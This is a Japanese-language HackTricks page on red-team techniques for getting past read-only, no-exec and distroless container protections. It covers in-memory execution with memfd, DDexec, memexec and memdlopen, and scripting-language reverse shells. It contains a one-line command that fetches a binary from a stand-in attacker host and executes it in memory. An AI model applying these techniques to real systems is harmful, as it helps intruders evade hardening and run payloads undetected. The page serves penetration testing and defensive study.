# バイパスFS保護: 読み取り専用 / 実行不可 / Distroless

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝**したい場合や **HackTricks をPDFでダウンロード**したい場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェック！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)** に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) をフォローする。
* **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリにPRを提出する。

</details>

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**ハッキングキャリア**に興味がある方や **解読不能なものをハック**したい方 - **採用中です！**（_流暢なポーランド語の読み書きが必要です_）。

{% embed url="https://www.stmcyber.com/careers" %}

## 動画

以下の動画では、このページで言及されているテクニックについてより詳しく説明されています:

* [**DEF CON 31 - ステルスおよび回避のためのLinuxメモリ操作の探索**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**DDexec-ngとインメモリdlopen()によるステルス侵入 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## 読み取り専用 / 実行不可シナリオ

**読み取り専用（ro）ファイルシステム保護**が **Linuxマシン**で **より一般的**になってきており、特にコンテナ内では **設定が簡単**であるためです。これは、`securitycontext` で **`readOnlyRootFilesystem: true`** を設定するだけでコンテナを **roファイルシステム**で実行できるためです:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

しかし、ファイルシステムが **ro** でマウントされていても、**`/dev/shm`** は書き込み可能のままなので、ディスクに書き込むことができないというのは偽物です。ただし、このフォルダは **実行不可保護** でマウントされるため、ここにバイナリをダウンロードしても **実行できません**。

{% hint style="warning" %}
レッドチームの観点からすると、これは既存のシステムにないバイナリ（バックドアや `kubectl` のような列挙ツール）を **ダウンロードして実行するのが複雑**になります。
{% endhint %}

## 最も簡単なバイパス: スクリプト

バイナリを言及しましたが、インタプリタがマシン内にある限り、**シェルスクリプト**（`sh` があれば）や **Pythonスクリプト**（`python` がインストールされていれば）など、**任意のスクリプトを実行**できます。

ただし、これだけではバイナリバックドアや実行する必要がある他のバイナリツールを実行するのには十分ではありません。

## メモリバイパス

ファイルシステムがそれを許可していない場合にバイナリを実行したい場合、**メモリから実行する**のが最善です。なぜなら、**保護がそこには適用されない**からです。

### FD + exec シスコールバイパス

**Python**、**Perl**、**Ruby** などの強力なスクリプトエンジンがマシン内にある場合、メモリにバイナリをダウンロードして実行し、これらの保護によって保護されないメモリファイルディスクリプタ（`create_memfd` シスコール）に保存し、その後 **`exec` シスコール** を呼び出して **fd を実行するファイル** として指定します。

これには、プロジェクト [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) を簡単に使用できます。バイナリを渡すと、バイナリが **b64エンコード** された **スクリプト** が生成され、`create_memfd` シスコールを呼び出して **fd** に保存されたバイナリを **デコードおよび解凍** する手順が記述され、それを実行する **exec** シスコールが呼び出されます。

{% hint style="warning" %}
これは、PHPやNodeなどの他のスクリプト言語では、スクリプトから **生のシスコールを呼び出すデフォルトの方法** がないため、`create_memfd` を呼び出して **バイナリを保存するメモリfd** を作成することができません。

また、`/dev/shm` 内のファイルで **通常のfd** を作成しても、**実行不可保護** が適用されるため、実行できません。
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) は、自分自身のプロセスの **`/proc/self/mem`** を上書きすることで、**プロセスが実行しているアセンブリコードを制御**し、 **シェルコード** を書き込んでプロセスを **任意のコードを実行** するように "変異" させる技術です。

{% hint style="success" %}
**DDexec / EverythingExec** を使用すると、自分自身のプロセスから **メモリ** から **自分自身のシェルコード** または **任意のバイナリ** を **ロードして実行** できます。
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
### MemExec

[**Memexec**](https://github.com/arget13/memexec)はDDexecの自然な次のステップです。これは**DDexecシェルコードをデーモン化**したもので、**異なるバイナリを実行**したいときには、DDexecを再起動する必要はありません。代わりに、DDexec技術を使用してmemexecシェルコードを実行し、**このデーモンと通信して新しいバイナリをロードして実行**できます。

**memexecを使用してPHPリバースシェルからバイナリを実行する例**は、[https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php)で見つけることができます。

### Memdlopen

DDexecと同様の目的を持つ[**memdlopen**](https://github.com/arget13/memdlopen)技術は、後で実行するためにメモリにバイナリをロードする**簡単な方法**を提供します。これにより、依存関係を持つバイナリをロードすることさえ可能になります。

## Distroless Bypass

### Distrolessとは

Distrolessコンテナには、特定のアプリケーションやサービスを実行するために必要な**最小限のコンポーネント**だけが含まれており、パッケージマネージャーやシェル、システムユーティリティなどのより大きなコンポーネントは除外されています。

Distrolessコンテナの目標は、**不要なコンポーネントを排除**し、悪用される可能性のある脆弱性の数を最小限に抑えることによって、コンテナの攻撃面を**縮小**することです。

### リバースシェル

Distrolessコンテナでは、通常のシェルを取得するための`sh`や`bash`などが**見つからない**かもしれません。`ls`、`whoami`、`id`などのバイナリも見つかりません...通常システムで実行するすべてのものが含まれていません。

{% hint style="warning" %}
したがって、通常どおりに**リバースシェル**を取得したり、システムを**列挙**することはできません。
{% endhint %}

ただし、侵害されたコンテナが例えばflask webを実行している場合、Pythonがインストールされているため、**Pythonリバースシェル**を取得できます。Nodeを実行している場合はNodeリバースシェルを取得でき、ほとんどの**スクリプト言語**でも同様です。

{% hint style="success" %}
スクリプト言語を使用すると、言語の機能を使用してシステムを**列挙**することができます。
{% endhint %}

**`read-only/no-exec`**の保護がない場合、リバースシェルを悪用してファイルシステムに**バイナリを書き込み**、それらを**実行**することができます。

{% hint style="success" %}
ただし、この種のコンテナでは通常これらの保護が存在しますが、**以前のメモリ実行技術を使用してそれらをバイパス**することができます。
{% endhint %}

**いくつかのRCE脆弱性を悪用して**、スクリプト言語の**リバースシェル**を取得し、メモリからバイナリを実行する方法の**例**は、[**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE)にあります。

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**ハッキングキャリア**に興味がある方や、**解読不能なものをハック**したい方 - **採用中です！**（_流暢なポーランド語の読み書きが必要です_）。

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**で**ゼロからヒーローまでのAWSハッキング**を学びましょう！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝**したり、**PDFでHackTricksをダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローする
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有する

</details>
